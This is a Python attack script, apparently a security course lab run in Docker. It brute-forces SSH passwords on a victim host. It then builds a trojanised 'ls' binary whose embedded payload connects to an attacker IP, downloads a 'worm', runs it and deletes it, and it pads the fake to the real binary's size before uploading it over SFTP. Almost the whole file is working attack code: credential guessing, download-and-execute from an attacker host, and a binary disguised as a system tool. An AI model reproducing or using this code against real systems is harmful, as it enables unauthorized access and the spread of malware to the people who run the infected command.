#!/usr/bin/env python3
import itertools
import paramiko
import socket
import sys
import os

def ssh(vic_ip, vic_user, vic_passwd):
    connection = paramiko.SSHClient()
    connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        connection.connect(hostname=vic_ip, username=vic_user, password=vic_passwd, timeout=1)
        print(f'[+] Successfully connected to {vic_ip} with {vic_user}:{vic_passwd}')
        return connection
    except (paramiko.AuthenticationException, socket.error):
        return None
    except paramiko.SSHException:
        print(f'[-] SSH exception with {vic_passwd}')
        return ssh(vic_ip, vic_user, vic_passwd)
    
def task1(vic_ip, vic_user):
    dat_file = open('victim.dat', 'r')
    frag_str = dat_file.read().splitlines()

    for plen in range(1, len(frag_str)+1):
        for comb in itertools.permutations(frag_str, plen):
            passwd = ''.join(comb)
            passwd = 'csc2024'
            connection = ssh(vic_ip, vic_user, passwd)
            if connection:
                return connection

virus_payload1 = '''
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host_ip, host_port))

while True:
    s.send("victim".encode())
    worm = s.recv(2048)
    break

f = open("worm", "w")
f.write(worm.decode())
f.close()
'''

virus_payload2 = '''
chmod +x worm
./worm
rm worm
'''

# init folder: /home/csc2024
def task2(connection, att_ip, att_port):
    with open('ls', 'w+') as f:
        f.write('#!/usr/bin/env bash\n')
        f.write('python3 - <<EOF\n')
        f.write('host_ip   = \"' + att_ip + '\"\n')
        f.write('host_port = ' + att_port + '\n')
        f.write(virus_payload1)
        f.write('EOF')
        f.write(virus_payload2)

    zip_byte = int(os.popen("ls -l ls.zip  | awk '{print $5}'").read())
    with open('ls', 'a') as f:
        f.write('dd if=ls of=lst.zip bs=1 skip=1024 count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
        f.write('unzip lst.zip >/dev/null 2>&1\n')
        f.write('rm lst.zip\n')
        f.write('./lst \"$@\" && rm lst\n')
        f.write('exit 0\n')

    original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
    padding_size = 1024 - original_byte
    with open('ls', 'a') as f:
        f.write('\x00' * padding_size)

    with open('ls.zip', 'rb') as f:
        data = f.read()
        
    with open('ls', 'ab') as f:
        f.write(data)

    _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
    ls_byte = stdout.read().decode()
    virus_byte = os.popen("wc -c ls | awk '{print $1}'").read()
    padding_size = int(ls_byte) - int(virus_byte) - 8
    with open('ls', 'ab') as f:
        f.write(b'\x00' * padding_size)
    with open('ls', 'a') as f:
        f.write('aabbccdd')

    # original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
    # xxd = os.popen("xxd ls | tail -n 1").read()
    # print(original_byte)
    # print(ls_byte)
    # print(xxd)
    
    sftp = connection.open_sftp()
    sftp.put('ls', '../../app/ls')
    _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: python3 crack_attack.py <victim_ip> <attacker_ip> <attacker_port>')
        sys.exit(1)

    ls_zip_base64_byte = os.popen('ls -l ls.zip | awk \'{print $5}\'').read()

    victim_ip   = sys.argv[1]
    victim_user = 'csc2024'

    attacker_ip   = sys.argv[2]
    attacker_port = sys.argv[3]

    connection = task1(victim_ip, victim_user)
    task2(connection, attacker_ip, attacker_port)
    os.system("rm ls")
    os.system("rm ls.zip")

# ----- env setup -----
# docker network prune
# sudo docker build -t csc2024-project3 -f csc2024-project3.Dockerfile .
# sudo docker compose -f csc2024-project3-docker-compose.yml up -d

# ----- reload yml -----
# sudo docker compose -f csc2024-project3-docker-compose.yml down

# ----- run attacker -----
# docker exec -it attacker bash
# cd ../home/csc2024/id
# python3 crack_attack.py  172.18.0.3 172.18.0.2 7777
# python3 attack_server.py 7777

# ----- run victim -----
# docker exec -it victim bash
